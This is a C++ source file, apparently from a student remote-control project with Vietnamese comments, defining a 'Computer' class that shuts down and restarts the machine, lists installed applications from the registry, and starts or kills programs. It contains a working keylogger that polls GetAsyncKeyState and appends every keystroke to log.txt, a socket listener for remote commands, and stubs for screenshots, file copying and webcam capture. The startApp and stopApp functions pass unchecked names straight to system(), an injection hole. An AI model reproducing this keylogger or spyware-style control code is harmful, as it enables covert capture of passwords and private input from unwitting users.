#include "Utility.h"
#include <vector>
#include <windows.h>
#include<fstream>
#include<iostream>

void Computer::shutdown() {
    system("shutdown /s /f /t 0");
}
void Computer::reset() {
    #ifdef _WIN32
        system("shutdown /r /t 0");  // Lệnh restart cho Windows
    #elif __linux__
        system("sudo reboot");       // Lệnh restart cho Linux
    #elif __APPLE__
        system("sudo shutdown -r now");  // Lệnh restart cho macOS
    #else
        #error "Operating system is not supported"
    #endif
}
void Computer::keyLogger() {
    char c;
    std::ofstream log;
    log.open("log.txt", std::ios::app);
    while (true) {
        for (c = 0; c <= 254; c++) {
            if (GetAsyncKeyState(c) & 0x1) {
                // std::ofstream log;
                // log.open("log.txt", std::ios::app);
                switch (c) {
                    case VK_ESCAPE:
                        log << "[esc]";
                        break;
                    case VK_SPACE:
                        log << "[space]";
                        break;
                    case VK_BACK:
                        log << "[backspace]";
                        break;
                    case VK_RETURN:
                        log << "[enter]";
                        break;
                    case VK_SHIFT:
                        log << "[shift]";
                        break;
                    case VK_CONTROL:
                        log << "[ctrl]";
                        break;
                    case VK_CAPITAL:
                        log << "[caps]";
                        break;
                    case VK_TAB:
                        log << "[tab]";
                        break;
                    case VK_MENU:
                        log << "[alt]";
                        break;
                    case VK_LBUTTON:
                        log << "[Lclick]";
                        break;
                    case VK_RBUTTON:
                        log << "[Rclick]";
                        break;
                    default: 
                        log << c;
                }
                // log.close();
            }
        }
    }
    log.close();
}

static std::atomic<bool> running{true};

void displayKeyPress(const char* action, int key) {
    std::cout << action << ": " << (char)key 
              << " (ASCII: " << key << ")" << std::endl;
}

// void keyboardMonitor() {
//     std::cout << "Keyboard monitoring started. Press ESC to exit.\n";
//     int ok = 0;
//     ofstream fout;
//     fout.open("log.txt", std::ios::app);
//     if (!fout.is_open())
//         cout << "Cannot open file! \n";
//     while(running) {
//         for(int key = 8; key <= 255; key++) {
//             if(GetAsyncKeyState(key) == -32767) {
//                 // if(key == VK_ESCAPE) {
//                 //     running = false;
//                 //     break;
//                 // }
//                 // if (ok == 0) {
//                 //     ok = 1;
//                 //     ofstream fout;
//                 //     fout.open("log.txt", std::ios::app);
//                 // }
//                 // ofstream fout;
//                 // fout.open("log.txt", std::ios::app);
//                 // //displayKeyPress("Key pressed", key);
//                     fout << "Key pressed" << ": " << (char)key << " (ASCII: " << key << ")" << std::endl;
//                 // while(fout.is_open())
//                 //     fout.close();
//             }
//         }
//         std::this_thread::sleep_for(std::chrono::milliseconds(10));
//     }
//     fout.close();
//     if (!fout.is_open())
//         cout << "Closed file! \n";
// }



// Example of how to use timer to stop monitoring after specific duration
void stopAfterDelay(SOCKET serverSocket) {
    char buffer[1024];
    int byteCount;
    while(true) {
        byteCount = recv(serverSocket, buffer, 1024, 0);
            if (byteCount > 0) {
                std::cout << buffer << "\n";
                if (strcmp(buffer, "STOP") == 0) {
                    running = false;
                    break;
                }
            }
    }
}

void Computer::listApp() {
    std::vector<std::wstring> applications;
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER /*HKEY_LOCAL_MACHINE*/, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD index = 0;
        wchar_t subKeyName[256];
        DWORD subKeyNameSize = 256;

        // Enumerate subkeys to find each application
        while (RegEnumKeyExW(hKey, index, subKeyName, &subKeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            HKEY hSubKey;
            if (RegOpenKeyExW(hKey, subKeyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                wchar_t appName[256];
                DWORD appNameSize = sizeof(appName);
                DWORD type;

                // Query the display name of the application
                if (RegQueryValueExW(hSubKey, L"DisplayName", NULL, &type, reinterpret_cast<LPBYTE>(appName), &appNameSize) == ERROR_SUCCESS && type == REG_SZ) {
                    applications.push_back(appName);
                }
                RegCloseKey(hSubKey);
            }
            index++;
            subKeyNameSize = 256;
        }
        RegCloseKey(hKey);
    }
    std::wofstream outFile(L"listApp.txt");

    if (!outFile) {
        std::wcerr << L"Failed to open file for writing: " << "listApp.txt" << std::endl;
        return;
    }

    for (const auto& app : applications) {
        outFile << app << std::endl;
        // std::wcerr << app << std::endl;
    }

    outFile.close();
}
void Computer::startApp(std::string name) {
    std::string command = "\"" + name + "\"";
    system(command.c_str());
}

void Computer::stopApp(std::string name) {
    std::string command = "taskkill /IM \"" + name + "\" /F";
    system(command.c_str());
}
// void listService();
// void startService(std::string name);
// void stopService(std::string name);
// void screenShot();
// void copyFile(std::string name);
// void startWebcam();
// void stopWebcam();


